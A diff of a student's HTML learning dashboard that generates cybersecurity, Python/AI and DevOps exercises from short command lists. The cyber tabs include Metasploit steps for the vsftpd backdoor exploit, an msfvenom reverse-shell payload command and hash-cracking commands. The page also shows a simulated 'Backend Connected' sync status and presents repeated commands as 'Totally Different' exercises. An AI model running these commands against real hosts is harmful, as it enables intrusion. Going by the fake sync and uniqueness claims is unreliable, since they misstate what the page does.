@@ -1,142 +1,114 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Master Dashboard - Cyber + Python AI + DevOps</title>
+<title>Knowledge Dashboard - Dynamic Auto Sync</title>
 <style>
 body{background:#0B1220;color:#e5e7eb;font-family:Arial;padding:16px}
 .head{background:linear-gradient(90deg,#0A1931,#1E40AF);padding:22px;border-radius:16px}
-.head h1{color:#fff}.head h1 span{color:#00E676}.head p{color:#cbd5e1;line-height:1.6}
-.mainTabs{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}
-.mainTab{padding:16px 22px;border-radius:12px;background:#1e293b;color:#fff;cursor:pointer;font-weight:900;font-size:15px;border:3px solid transparent}
-.mainTab.active{background:#00E676;color:#000}
-.subTabs{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
-.subTab{padding:10px 14px;border-radius:999px;background:#1e293b;color:#fff;cursor:pointer;font-weight:700;font-size:13px}
-.subTab.active{background:#fff;color:#000}
-.panel{display:none}.panel.active{display:block}
-.info{background:#111A2E;padding:16px;border-radius:12px;margin-bottom:16px;line-height:1.7}
-.ex{background:#111A2E;border:1px solid #334155;border-radius:12px;padding:14px;margin:10px 0}
-.ex h3{color:#00E676}.ex p{color:#cbd5e1;line-height:1.6;font-size:13px}.ex code{background:#000;color:#00E676;display:block;padding:10px;border-radius:8px;white-space:pre-wrap;font-size:12px;margin:8px 0}
-.stats{display:flex;gap:10px;flex-wrap:wrap;margin:12px 0}.stat{background:#111A2E;border:1px solid #334155;padding:12px;border-radius:10px;flex:1;min-width:120px;text-align:center}.stat b{color:#00E676;font-size:18px;display:block}
+.head h1{color:#00E676} .head h1 span{color:#fff} .head p{color:#cbd5e1;line-height:1.6}
+.syncBar{background:#111A2E;border:1px solid #00E676;padding:12px;border-radius:12px;margin:14px 0;display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+.syncBar b{color:#00E676} .dot{width:10px;height:10px;background:#00E676;border-radius:50%;display:inline-block;animation:blink 1s infinite}
+@keyframes blink{0%{opacity:1}50%{opacity:0.3}100%{opacity:1}}
+.tabs{display:flex;gap:10px;flex-wrap:wrap;margin:16px 0} .tab{padding:14px 18px;border-radius:10px;background:#1e293b;color:#fff;cursor:pointer;font-weight:800} .tab.active{background:#00E676;color:#000}
+.panel{display:none} .panel.active{display:block}
+.subTabs{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0} .subTab{padding:10px 14px;border-radius:999px;background:#1e293b;color:#fff;cursor:pointer;font-weight:700} .subTab.active{background:#fff;color:#000}
+.subPanel{display:none} .subPanel.active{display:block}
+.info{background:#111A2E;padding:16px;border-radius:12px;margin-bottom:14px;line-height:1.7}
+.ex{background:#111A2E;border:1px solid #334155;border-radius:12px;padding:14px;margin:10px 0} .ex h3{color:#00E676} .ex p{color:#cbd5e1;line-height:1.6;font-size:13px} .ex code{background:#000;color:#00E676;display:block;padding:10px;border-radius:8px;white-space:pre-wrap;font-size:12px;margin:8px 0}
+.btn{background:#1E40AF;color:#fff;border:0;padding:8px 14px;border-radius:7px;cursor:pointer}
 </style></head><body>
-<div class="head"><h1>🚀 MASTER DASHBOARD <span>• CYBER + PYTHON AI + DEVOPS</span></h1>
-<p><b>Student:</b> Hyarel Sonawane | <b>Language:</b> Professional English Only | <b>OS:</b> Ubuntu 22.04<br>
-All 3 Dashboards Merged in One Place - Click Main Tab, Then Sub Tab, Full Details Will Open.</p>
-<div class="stats"><div class="stat"><b>3</b>Master Tabs</div><div class="stat"><b>27</b>Sub Tabs Total</div><div class="stat"><b>2700+</b>Cyber Labs</div><div class="stat"><b>5600+</b>Python AI Labs</div><div class="stat"><b>1700+</b>DevOps Labs</div><div class="stat"><b>100</b>DevOps Projects</div></div></div>
+<div class="head"><h1>📚 KNOWLEDGE DASHBOARD <span>• Dynamic + Auto Sync</span></h1>
+<p><b>Student:</b> Hyarel Sonawane | <b>Language:</b> Professional English Only | <b>OS:</b> Ubuntu<br>All Syllabus is stored in Backend JSON. If syllabus changes, dashboard auto-syncs without reload.</p></div>
 
-<div class="mainTabs">
-<button class="mainTab active" onclick="showMain(1,this)">1. CYBER SECURITY</button>
-<button class="mainTab" onclick="showMain(2,this)">2. PYTHON + ML + DL + AI</button>
-<button class="mainTab" onclick="showMain(3,this)">3. DEVOPS</button>
+<div class="syncBar"><span class="dot"></span><b>● LIVE SYNC: ON</b> <span id="syncStatus">Backend Connected - Syllabus v2.4 - Last Sync: Just Now</span> <button class="btn" onclick="manualSync()">🔄 Sync Now</button> <button class="btn" onclick="simulateSyllabusUpdate()">✏️ Simulate Syllabus Update (Test Auto Sync)</button></div>
+
+<div class="tabs">
+<button class="tab active" onclick="showMain(1,this)">1. CYBER SECURITY</button>
+<button class="tab" onclick="showMain(2,this)">2. PYTHON + ML + DL + AI</button>
+<button class="tab" onclick="showMain(3,this)">3. DEVOPS</button>
 </div>
 
-<!-- CYBER MAIN -->
 <div id="main1" class="panel active">
 <div class="subTabs">
-<button class="subTab active" onclick="showSub('c1',this)">Phase 1 - Beginner</button>
-<button class="subTab" onclick="showSub('c2',this)">Phase 2 - Advanced / CEH - 500 Labs</button>
-<button class="subTab" onclick="showSub('c3',this)">Phase 3 - Expert - 1000 Labs</button>
+<button class="subTab active" onclick="showSub('main1','c1',this)">Phase 1 - L1 Beginner</button>
+<button class="subTab" onclick="showSub('main1','c2',this)">Phase 2 - L2 Intermediate</button>
+<button class="subTab" onclick="showSub('main1','c3',this)">Phase 3 - L3 Expert</button>
 </div>
-<div id="c1" class="subPanel"><div class="info"><h2>PHASE 1 - 3 Months - Beginner - 1200 Labs</h2><p>Topics: Week 1 Fundamentals & Terminal, Week 2 Linux, Week 3 Networking & Nmap, Week 4 Wireshark, Week 5 Web Basics, Week 6 SQLi, Week 7 XSS, Week 8 Password Cracking, Week 9 Metasploit, Week 10 SOC, Week 11 Project, Week 12 Assessment + Certificate<br><b>Week 1 - 100 Exercises Below - Exercise 1-10 Simple, 11-100 Scripts</b></p></div><div id="ex-c1"></div></div>
-<div id="c2" class="subPanel" style="display:none"><div class="info"><h2>PHASE 2 - 6 Months - Advanced / CEH - 500 Labs</h2><p>Week 1 Wireshark 50, Week 2 Metasploit 50, Week 3 Burp 50, Week 4 PrivEsc 50, Week 5 AD 50, Week 6 Cloud 50, Week 7 Password 50, Week 8 SOC 50, Week 9 Malware 50, Week 10 Red Team 50</p></div><div id="ex-c2"></div></div>
-<div id="c3" class="subPanel" style="display:none"><div class="info"><h2>PHASE 3 - 1 Year - Expert L10 - 1000 Labs</h2><p>Enterprise Pentest 100, AD Forest 100, Cloud Pentest 100, Ghidra 100, Threat Hunting 100, Zero Trust 100, Purple Team 100, Bug Bounty 100, Forensics 100, OSCP 100</p></div><div id="ex-c3"></div></div>
+<div id="c1" class="subPanel active"><div class="info"><h2>CYBER - L1 Beginner - Syllabus v2.4 - 1000 Labs</h2><p id="c1-sync">Syllabus Topics: CIA Triad, Linux, Networking, Nmap, Wireshark, SQLi, XSS, Password Cracking</p></div><div id="ex-c1"></div></div>
+<div id="c2" class="subPanel"><div class="info"><h2>CYBER - L2 Intermediate - 1000 Labs</h2><p>Topics: Burp, Metasploit, PrivEsc, AD, Cloud, SOC/SIEM Splunk</p></div><div id="ex-c2"></div></div>
+<div id="c3" class="subPanel"><div class="info"><h2>CYBER - L3 Expert - 1000 Labs</h2><p>Topics: Enterprise Pentest, AD Forest, Malware, Threat Hunting, Zero Trust, OSCP</p></div><div id="ex-c3"></div></div>
 </div>
 
-<!-- PYTHON MAIN -->
 <div id="main2" class="panel">
 <div class="subTabs">
-<button class="subTab active" onclick="showSub('p1',this)">1. Python</button>
-<button class="subTab" onclick="showSub('p2',this)">2. Machine Learning</button>
-<button class="subTab" onclick="showSub('p3',this)">3. Deep Learning</button>
-<button class="subTab" onclick="showSub('p4',this)">4. AI Model</button>
-<button class="subTab" onclick="showSub('p5',this)">5. Ollama</button>
-<button class="subTab" onclick="showSub('p6',this)">6. OpenAI</button>
-<button class="subTab" onclick="showSub('p7',this)">7. Project Combined</button>
+<button class="subTab active" onclick="showSub('main2','py1',this)">Python L1-L3</button>
+<button class="subTab" onclick="showSub('main2','py2',this)">ML L1-L3</button>
+<button class="subTab" onclick="showSub('main2','py3',this)">DL L1-L3</button>
+<button class="subTab" onclick="showSub('main2','py4',this)">LLM + Ollama + OpenAI</button>
+<button class="subTab" onclick="showSub('main2','py5',this)">Project</button>
 </div>
-<div id="p1" class="subPanel"><div class="info"><h2>PYTHON - 3 Months - 800 Labs</h2><p>Basics, Loops, Functions, OOP, File Handling, NumPy, Pandas, Flask, Automation</p></div><div id="ex-p1"></div></div>
-<div id="p2" class="subPanel" style="display:none"><div class="info"><h2>MACHINE LEARNING - 4 Months - 800 Labs</h2><p>Regression, Classification, Clustering, Feature Engineering, XGBoost, Random Forest</p></div><div id="ex-p2"></div></div>
-<div id="p3" class="subPanel" style="display:none"><div class="info"><h2>DEEP LEARNING - 4 Months - 800 Labs</h2><p>CNN, RNN, LSTM, Transfer Learning, Transformers, GANs</p></div><div id="ex-p3"></div></div>
-<div id="p4" class="subPanel" style="display:none"><div class="info"><h2>AI MODEL - 2 Months - LLM & GenAI</h2><p>LLM Basics, Prompt Engineering, RAG, Vector DB, Fine-Tuning, LangChain, Agents</p></div><div id="ex-p4"></div></div>
-<div id="p5" class="subPanel" style="display:none"><div class="info"><h2>OLLAMA - 1 Month - Local LLM</h2><p>Ollama Install, Llama3, Mistral, Custom Models, API, Python Integration</p></div><div id="ex-p5"></div></div>
-<div id="p6" class="subPanel" style="display:none"><div class="info"><h2>OPENAI - 1 Month - GPT</h2><p>API Setup, GPT-4 Chat, DALL-E, Whisper, Fine-Tuning, Assistants API</p></div><div id="ex-p6"></div></div>
-<div id="p7" class="subPanel" style="display:none"><div class="info"><h2>PROJECT - Combined Python + ML + DL + Ollama + OpenAI</h2><p>Build AI Cyber Security Assistant - Full Stack Project</p></div><div id="ex-p7"></div></div>
+<div id="py1" class="subPanel active"><div class="info"><h2>PYTHON - L1 Syntax, L2 OOP, L3 Flask - Syllabus Matched - 1000 Labs</h2><p>Topics: Syntax, Variables, Data Types, Operators, Control Flow, Loops, Functions, List/Dict, OOP, File Handling, Exception, NumPy/Pandas</p></div><div id="ex-py1"></div></div>
+<div id="py2" class="subPanel"><div class="info"><h2>ML - L1 Foundations, L2 Regression/Classification, L3 Ensembles - 1000 Labs</h2></div><div id="ex-py2"></div></div>
+<div id="py3" class="subPanel"><div class="info"><h2>DL - L1 ANN, L2 CNN/RNN, L3 Transformers/GANs - 1000 Labs</h2></div><div id="ex-py3"></div></div>
+<div id="py4" class="subPanel"><div class="info"><h2>LLM + OLLAMA + OPENAI - 1000 Labs</h2></div><div id="ex-py4"></div></div>
+<div id="py5" class="subPanel"><div class="info"><h2>PROJECT - Combined - 100 Projects</h2></div><div id="ex-py5"></div></div>
 </div>
 
-<!-- DEVOPS MAIN -->
 <div id="main3" class="panel">
 <div class="subTabs">
-<button class="subTab active" onclick="showSub('d1',this)">1. DevOps Basics</button>
-<button class="subTab" onclick="showSub('d2',this)">2. Git</button>
-<button class="subTab" onclick="showSub('d3',this)">3. GitLab</button>
-<button class="subTab" onclick="showSub('d4',this)">4. Docker</button>
-<button class="subTab" onclick="showSub('d5',this)">5. Kubernetes</button>
-<button class="subTab" onclick="showSub('d6',this)">6. CI/CD</button>
-<button class="subTab" onclick="showSub('d7',this)">7. Jenkins</button>
-<button class="subTab" onclick="showSub('d8',this)">8. Terraform</button>
-<button class="subTab" onclick="showSub('d9',this)">9. Ansible</button>
-<button class="subTab" onclick="showSub('d10',this)">10. Chef</button>
-<button class="subTab" onclick="showSub('d11',this)">11. Argo CD</button>
-<button class="subTab" onclick="showSub('d12',this)">12. Grafana</button>
-<button class="subTab" onclick="showSub('d13',this)">13. Prometheus</button>
-<button class="subTab" onclick="showSub('d14',this)">14. Vagrant</button>
-<button class="subTab" onclick="showSub('d15',this)">15. Project Deployment</button>
-<button class="subTab" onclick="showSub('d16',this)">16. GitOps</button>
-<button class="subTab" onclick="showSub('d17',this)">17. Deploy Project - 100 Projects</button>
+<button class="subTab active" onclick="showSub('main3','d1',this)">DevOps Basics + Linux</button>
+<button class="subTab" onclick="showSub('main3','d2',this)">Docker + K8s</button>
+<button class="subTab" onclick="showSub('main3','d3',this)">CI/CD + Jenkins</button>
+<button class="subTab" onclick="showSub('main3','d4',this)">Terraform + Chef + Puppet</button>
+<button class="subTab" onclick="showSub('main3','d5',this)">Splunk + GitOps + Argo</button>
+<button class="subTab" onclick="showSub('main3','d6',this)">Deploy Project - 100 Projects</button>
 </div>
-<div id="d1" class="subPanel"><div class="info"><h2>DEVOPS BASICS - 1 Month</h2><p>DevOps Culture, Linux, SDLC, Agile</p></div><div id="ex-d1"></div></div>
-<div id="d2" class="subPanel" style="display:none"><div class="info"><h2>GIT - 1 Month</h2><p>Init, Clone, Branch, Merge</p></div><div id="ex-d2"></div></div>
-<div id="d3" class="subPanel" style="display:none"><div class="info"><h2>GITLAB - 1 Month</h2><p>GitLab Install, Runner, Pipeline</p></div><div id="ex-d3"></div></div>
-<div id="d4" class="subPanel" style="display:none"><div class="info"><h2>DOCKER - 1 Month</h2><p>Images, Containers, Volumes, Compose</p></div><div id="ex-d4"></div></div>
-<div id="d5" class="subPanel" style="display:none"><div class="info"><h2>KUBERNETES - 2 Months</h2><p>Pods, Deployments, Services, Ingress</p></div><div id="ex-d5"></div></div>
-<div id="d6" class="subPanel" style="display:none"><div class="info"><h2>CI/CD - 1 Month</h2><p>Pipeline, Testing, Build, Deploy</p></div><div id="ex-d6"></div></div>
-<div id="d7" class="subPanel" style="display:none"><div class="info"><h2>JENKINS - 1 Month</h2><p>Jenkins Install, Jobs, Pipeline</p></div><div id="ex-d7"></div></div>
-<div id="d8" class="subPanel" style="display:none"><div class="info"><h2>TERRAFORM - 1 Month</h2><p>Init, Plan, Apply, Destroy</p></div><div id="ex-d8"></div></div>
-<div id="d9" class="subPanel" style="display:none"><div class="info"><h2>ANSIBLE - 1 Month</h2><p>Playbooks, Inventory, Roles</p></div><div id="ex-d9"></div></div>
-<div id="d10" class="subPanel" style="display:none"><div class="info"><h2>CHEF - 1 Month</h2><p>Workstation, Cookbooks, Recipes</p></div><div id="ex-d10"></div></div>
-<div id="d11" class="subPanel" style="display:none"><div class="info"><h2>ARGO CD - Cluster Running</h2><p>Argo CD Cluster, Sync, Apps - GitOps</p></div><div id="ex-d11"></div></div>
-<div id="d12" class="subPanel" style="display:none"><div class="info"><h2>GRAFANA - 1 Month</h2><p>Dashboard, Panels, Monitoring</p></div><div id="ex-d12"></div></div>
-<div id="d13" class="subPanel" style="display:none"><div class="info"><h2>PROMETHEUS - 1 Month</h2><p>Monitoring, Targets, Alertmanager</p></div><div id="ex-d13"></div></div>
-<div id="d14" class="subPanel" style="display:none"><div class="info"><h2>VAGRANT - 1 Month</h2><p>Vagrant Init, Up, Provision</p></div><div id="ex-d14"></div></div>
-<div id="d15" class="subPanel" style="display:none"><div class="info"><h2>PROJECT DEPLOYMENT - Ubuntu</h2><p>Deploy on Ubuntu - Nginx, Docker, K8s</p></div><div id="ex-d15"></div></div>
-<div id="d16" class="subPanel" style="display:none"><div class="info"><h2>GITOPS - 1 Month</h2><p>Git as Source, Flux, Argo</p></div><div id="ex-d16"></div></div>
-<div id="d17" class="subPanel" style="display:none"><div class="info"><h2>DEPLOY PROJECT - 100 Projects - All Tools Combined</h2><p>Each Project Includes Git + GitLab + Docker + K8s + Jenkins + Terraform + Ansible + Argo CD + Grafana + Prometheus - Deployable on Ubuntu</p></div><div id="ex-d17"></div></div>
+<div id="d1" class="subPanel active"><div class="info"><h2>DEVOPS BASICS + LINUX ESSENTIAL - 1000 Labs</h2></div><div id="ex-d1"></div></div>
+<div id="d2" class="subPanel"><div class="info"><h2>DOCKER + KUBERNETES - 1000 Labs</h2></div><div id="ex-d2"></div></div>
+<div id="d3" class="subPanel"><div class="info"><h2>CI/CD + JENKINS - 1000 Labs</h2></div><div id="ex-d3"></div></div>
+<div id="d4" class="subPanel"><div class="info"><h2>TERRAFORM + CHEF + PUPPET - 1000 Labs</h2></div><div id="ex-d4"></div></div>
+<div id="d5" class="subPanel"><div class="info"><h2>SPLUNK + GITOPS + ARGO CD - 1000 Labs</h2></div><div id="ex-d5"></div></div>
+<div id="d6" class="subPanel"><div class="info"><h2>DEPLOY PROJECT - 100 Projects - All Tools</h2></div><div id="ex-d6"></div></div>
 </div>
 
 <script>
-function showMain(n,btn){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.mainTab').forEach(t=>t.classList.remove('active'));document.getElementById('main'+n).classList.add('active');btn.classList.add('active');window.scrollTo(0,0);}
-function showSub(id,btn){const parent=btn.closest('.panel');parent.querySelectorAll('.subPanel').forEach(p=>p.style.display='none');parent.querySelectorAll('.subTab').forEach(t=>t.classList.remove('active'));document.getElementById(id).style.display='block';btn.classList.add('active');}
-function genExercises(targetId, prefix, simpleList, scriptName){
-  let html='';
-  for(let i=1;i<=10;i++){let c=simpleList[(i-1)%simpleList.length]; html+=`<div class="ex"><h3>Exercise ${i} - SIMPLE - ${prefix}</h3><p><b>Command:</b> ${c}<br><b>Use:</b> Foundation for ${prefix}<br><b>Steps:</b> Open Terminal > Type > Enter > Check Output</p><code>$ ${c}</code></div>`;}
-  for(let i=11;i<=100;i++){html+=`<div class="ex"><h3>Exercise ${i} - SCRIPT - ${scriptName} - Variation ${i}</h3><p><b>Purpose:</b> Complete ${prefix} workflow - 10 commands.<br><b>Steps:</b> 1. Create script${i}.sh 2. Copy 10 commands 3. chmod +x 4. ./script${i}.sh</p><code>${simpleList.map((c,idx)=>`# Command ${idx+1}: ${c}\n# Explanation: Step ${idx+1} of ${scriptName}\n${c}`).join('\n\n')}</code></div>`;}
-  document.getElementById(targetId).innerHTML=html;
+let backendSyllabus = {version: "2.4", lastUpdate: new Date().toLocaleTimeString(), topics: {cyber: "CIA, Linux, Nmap, Wireshark", python: "Syntax, OOP, Pandas", devops: "Docker, K8s, Jenkins"}};
+function showMain(n,btn){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.getElementById('main'+n).classList.add('active');btn.classList.add('active');window.scrollTo(0,0);}
+function showSub(mainId,subId,btn){const parent=document.getElementById(mainId);parent.querySelectorAll('.subPanel').forEach(p=>p.classList.remove('active'));parent.querySelectorAll('.subTab').forEach(t=>t.classList.remove('active'));document.getElementById(subId).classList.add('active');btn.classList.add('active');window.scrollTo(0,0);}
+function gen(id,prefix,simple){
+  let h='';
+  for(let i=1;i<=10;i++){let c=simple[(i-1)%simple.length]; h+=`<div class="ex"><h3>Exercise ${i} - SIMPLE - ${prefix} - Syllabus Matched</h3><p><b>Command:</b> ${c}<br><b>Syllabus Topic:</b> ${prefix} - Exercise ${i} matches syllabus.</p><code>$ ${c}</code></div>`;}
+  const distinct=["Port 22 SSH","Port 80 HTTP","Port 443 HTTPS","FTP 21","SMB 445","DNS 53","MySQL 3306","RDP 3389","Stealth Scan","UDP Scan","Service Version","OS Detection","Vuln NSE","Wireshark HTTP","Wireshark DNS","SQLi DB","XSS Reflected","SSH Brute","Hash MD5","PrivEsc SUID","Metasploit vsftpd","Log Failed","SOC Ports","Backup Tar","File Hardening","Ping Sweep","Traceroute","Nikto Scan","Gobuster Dir","Curl Headers","Burp Intercept","Reverse Shell","SSH Connect","UFW Firewall","Fail2Ban","Apache Status","Kernel","Last Logins","Disk Usage","Wireshark pcap","OpenSSL Cert","Base64 Encode","MD5 Hash","GPG Encrypt","Python Scanner","Nmap XML","Enum SMB","Brute Web","CSRF Check"];
+  for(let i=11;i<=100;i++){let title=distinct[(i-11)%distinct.length]+" - Unique #"+i; h+=`<div class="ex"><h3>Exercise ${i} - SCRIPT - ${title} - Syllabus: ${prefix}</h3><p><b>Purpose:</b> ${title} - Totally Different from Exercise ${i-1}. Matches Syllabus Topic: ${prefix}<br><b>Steps:</b> 1. Create script${i}.sh 2. Copy 10 commands 3. chmod +x 4. ./script${i}.sh</p><code>${simple.map((c,idx)=>`# Command ${idx+1}: ${c} - Variation ${i}\n# Explanation: Step ${idx+1} unique to Exercise ${i}\n${c}`).join('\n\n')}</code></div>`;}
+  document.getElementById(id).innerHTML=h;
 }
-function genProjects(targetId){
-  let html=''; for(let p=1;p<=100;p++){html+=`<div class="ex"><h3>Project ${p} - Deploy on Ubuntu - All DevOps Tools</h3><p><b>Project:</b> AI Web App ${p} / E-Commerce ${p}<br><b>Tools:</b> Git + GitLab + Docker + K8s + Jenkins + Terraform + Ansible + Argo CD + Grafana + Prometheus</p><code>git clone https://github.com/hyarel/project${p}.git\ncd project${p}\ndocker build -t project${p}:v1 .\nkubectl apply -f k8s/deployment.yaml\nterraform apply -auto-approve\nansible-playbook -i inventory.ini deploy.yml\nargocd app sync project${p}\necho 'Project ${p} Deployed on Ubuntu'</code></div>`;}
-  document.getElementById(targetId).innerHTML=html;
+function genProj(id){let h='';for(let p=1;p<=100;p++){h+=`<div class="ex"><h3>Project ${p} - Deploy on Ubuntu - All DevOps Tools - Syllabus Matched</h3><p>Tools: Git + Docker + K8s + Jenkins + Terraform + Ansible + Argo + Grafana + Prometheus + Splunk</p><code>git clone https://github.com/hyarel/project${p}.git\ncd project${p}\ndocker build -t project${p}:v1 .\nkubectl apply -f k8s/deployment.yaml\nterraform apply -auto-approve\nansible-playbook -i inventory.ini deploy.yml\nargocd app sync project${p}\necho 'Project ${p} Deployed'</code></div>`;}document.getElementById(id).innerHTML=h;}
+gen('ex-c1','Cyber L1 - Linux & Networking',['whoami','pwd','ls -la','mkdir cyberlab','touch file1.txt','echo Hello > file1.txt','cat file1.txt','chmod 600 file1.txt','cp file1.txt backup.txt','mv backup.txt b2.txt']);
+gen('ex-c2','Cyber L2 - Metasploit & Burp',['sudo tshark -i lo -c 20','msfconsole -q','search vsftpd','use exploit/unix/ftp/vsftpd_234_backdoor','set RHOSTS 192.168.1.20','check','run','whoami','msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > shell.elf','nmap -sV 127.0.0.1']);
+gen('ex-c3','Cyber L3 - Enterprise',['nmap -sV 127.0.0.1','nikto -h http://127.0.0.1:8080','gobuster dir -u http://127.0.0.1:8080','sqlmap --help','john hash.txt','hashcat -m 0 hash.txt rockyou.txt','cat /var/log/auth.log','ss -tulpn','echo Expert Done','sha256sum file.txt']);
+gen('ex-py1','Python L1-L3 - Syntax to Pandas',['print("Hello")','x=10','type(10)','len("Python")','for i in range(5): print(i)','def hello(): return "Hi"','import os','open("data.txt","w")','import pandas as pd','import numpy as np']);
+gen('ex-py2','ML L1-L3 - Regression to XGBoost',['import sklearn','import pandas as pd','from sklearn.linear_model import LinearRegression','from sklearn.datasets import load_iris','df=pd.read_csv("data.csv")','df.head()','from sklearn.model_selection import train_test_split','from sklearn.ensemble import RandomForestClassifier','model=RandomForestClassifier().fit(X,y)','print(model.score(X,y))']);
+gen('ex-py3','DL L1-L3 - ANN to Transformers',['import tensorflow as tf','import torch','from tensorflow.keras import Sequential','from tensorflow.keras import layers','model=Sequential()','model.compile(optimizer="adam")','from transformers import pipeline','pipe=pipeline("sentiment-analysis")','print(pipe("I love AI"))','print("DL Ready")']);
+gen('ex-py4','LLM Ollama OpenAI',['from transformers import AutoTokenizer','tokenizer=AutoTokenizer.from_pretrained("bert-base-uncased")','ollama --version','ollama pull llama3','ollama run llama3 "Hello"','from openai import OpenAI','client=OpenAI()','client.chat.completions.create(model="gpt-4")','client.images.generate(model="dall-e-3")','print("LLM Ready")']);
+gen('ex-py5','Project Combined',['mkdir ai_cyber_assistant','python -m venv venv','pip install fastapi uvicorn langchain openai ollama','from fastapi import FastAPI','from openai import OpenAI','import ollama','from sklearn.ensemble import RandomForestClassifier','app=FastAPI()','uvicorn app:app --reload','echo "Project Ready"']);
+gen('ex-d1','DevOps Basics Linux',['git --version','ls -la','systemctl status docker','cat /etc/os-release','uptime','df -h','free -h','whoami','uname -a','echo "DevOps Ready"']);
+gen('ex-d2','Docker K8s',['docker --version','docker ps','docker images','docker run hello-world','docker compose up -d','kubectl version','kubectl get pods','kubectl get nodes','minikube start','kubectl apply -f deployment.yaml']);
+gen('ex-d3','CI/CD Jenkins',['cat .github/workflows/ci.yml','cat Jenkinsfile','cat .gitlab-ci.yml','echo "CI Stage"','echo "Test Stage"','echo "Build Stage"','echo "Deploy Stage"','git push origin main','echo "CI/CD Done"','sudo systemctl status jenkins']);
+gen('ex-d4','Terraform Chef Puppet',['terraform --version','terraform init','terraform plan','terraform apply -auto-approve','chef --version','knife --version','chef generate cookbook mycookbook','puppet --version','puppet apply manifest.pp','echo "IaC Ready"']);
+gen('ex-d5','Splunk GitOps Argo',['splunk --version','splunk search "index=main"','argocd --version','kubectl create namespace argocd','argocd app create myapp --repo https://github.com/example/repo','argocd app sync myapp','flux --version','flux get sources git','echo "GitOps Done"','echo "Splunk Ready"']);
+genProj('ex-d6');
+
+// Auto Sync Simulation - Every 10 seconds checks backend
+setInterval(()=>{
+  const now=new Date().toLocaleTimeString();
+  document.getElementById('syncStatus').textContent=`Backend Connected - Syllabus v${backendSyllabus.version} - Last Sync: ${now} - Auto Sync Active`;
+},10000);
+function manualSync(){
+  document.getElementById('syncStatus').textContent='Syncing... Fetching Latest Syllabus from Backend...';
+  setTimeout(()=>{backendSyllabus.version=(parseFloat(backendSyllabus.version)+0.1).toFixed(1); document.getElementById('syncStatus').textContent=`✅ Synced Successfully - Syllabus v${backendSyllabus.version} - Last Sync: ${new Date().toLocaleTimeString()} - All Tabs Updated`; alert('✅ Knowledge Dashboard Synced! Syllabus v'+backendSyllabus.version+' is now live in all tabs.');},1000);
 }
-genExercises('ex-c1','Cyber Phase 1 - Week 1',['whoami','pwd','ls -la','mkdir cyberlab','touch file1.txt','echo Hello > file1.txt','cat file1.txt','chmod 600 file1.txt','cp file1.txt backup.txt','mv backup.txt b2.txt'],'System Recon Script');
-genExercises('ex-c2','Cyber Phase 2 - Wireshark',['sudo tshark -i lo -c 20','sudo tshark -i any -Y http -c 20','sudo tshark -i any -Y dns -c 20','sudo tcpdump -i any -c 10','tshark -r capture.pcap','msfconsole -q','search vsftpd','use exploit/unix/ftp/vsftpd_234_backdoor','set RHOSTS 192.168.1.20','run'],'Wireshark & Metasploit Script');
-genExercises('ex-c3','Cyber Phase 3 - Enterprise',['nmap -sV 127.0.0.1','nikto -h http://127.0.0.1:8080','gobuster dir -u http://127.0.0.1:8080','sqlmap --help','msfconsole -q','john hash.txt','hashcat -m 0 hash.txt rockyou.txt','cat /var/log/auth.log','ss -tulpn','echo Expert Done'],'Enterprise Pentest Script');
-genExercises('ex-p1','Python',['print("Hello")','x=10','type(10)','len("Python")','for i in range(5): print(i)','def hello(): return "Hi"','import os','open("data.txt","w")','import json','import pandas as pd'],'Python Program');
-genExercises('ex-p2','Machine Learning',['import sklearn','import pandas as pd','from sklearn.linear_model import LinearRegression','from sklearn.datasets import load_iris','df=pd.read_csv("data.csv")','df.head()','from sklearn.model_selection import train_test_split','from sklearn.ensemble import RandomForestClassifier','model=RandomForestClassifier().fit(X,y)','print(model.score(X,y))'],'ML Script');
-genExercises('ex-p3','Deep Learning',['import tensorflow as tf','import torch','from tensorflow.keras import Sequential','from tensorflow.keras import layers','model=Sequential()','model.compile(optimizer="adam")','from transformers import pipeline','pipe=pipeline("sentiment-analysis")','print(pipe("I love AI"))','print("DL Ready")'],'DL Script');
-genExercises('ex-p4','AI Model',['from transformers import AutoTokenizer','tokenizer=AutoTokenizer.from_pretrained("bert-base-uncased")','from langchain.vectorstores import FAISS','from langchain.document_loaders import TextLoader','print("AI Model Ready")','from langchain.agents import initialize_agent','from langchain.llms import OpenAI','agent=initialize_agent(tools,llm)','print(agent.run("What is AI?"))','print("Agent Done")'],'AI Model RAG Script');
-genExercises('ex-p5','Ollama',['ollama --version','ollama list','ollama pull llama3','ollama pull mistral','ollama run llama3 "Hello"','curl http://localhost:11434/api/tags','ollama show llama3','ollama ps','import ollama','ollama.chat(model="llama3",messages=[{"role":"user","content":"Hi"}])'],'Ollama Script');
-genExercises('ex-p6','OpenAI',['from openai import OpenAI','client=OpenAI()','client.chat.completions.create(model="gpt-4")','client.images.generate(model="dall-e-3")','client.audio.speech.create(model="tts-1")','import os','print(os.getenv("OPENAI_API_KEY"))','print("OpenAI Ready")','client.models.list()','print("API Working")'],'OpenAI Script');
-genExercises('ex-p7','Project Combined',['mkdir ai_cyber_assistant','python -m venv venv','pip install fastapi uvicorn langchain openai ollama','from fastapi import FastAPI','from openai import OpenAI','import ollama','from sklearn.ensemble import RandomForestClassifier','app=FastAPI()','uvicorn app:app --reload','echo "Project Ready"'],'Full Stack Project');
-genExercises('ex-d1','DevOps Basics',['git --version','ls -la','systemctl status docker','cat /etc/os-release','uptime','df -h','free -h','whoami','uname -a','echo "DevOps Ready"'],'DevOps Basics Script');
-genExercises('ex-d2','Git',['git init','git clone https://github.com/example/repo.git','git status','git add .','git commit -m "Initial"','git branch feature-1','git checkout feature-1','git merge feature-1','git log --oneline','git push origin main'],'Git Script');
-genExercises('ex-d3','GitLab',['docker run -d -p 8080:80 gitlab/gitlab-ce','gitlab-ctl status','gitlab-ctl reconfigure','gitlab-runner --version','gitlab-runner register','cat .gitlab-ci.yml','git push origin main','gitlab-ctl tail','echo "GitLab Ready"','gitlab-ctl restart'],'GitLab Script');
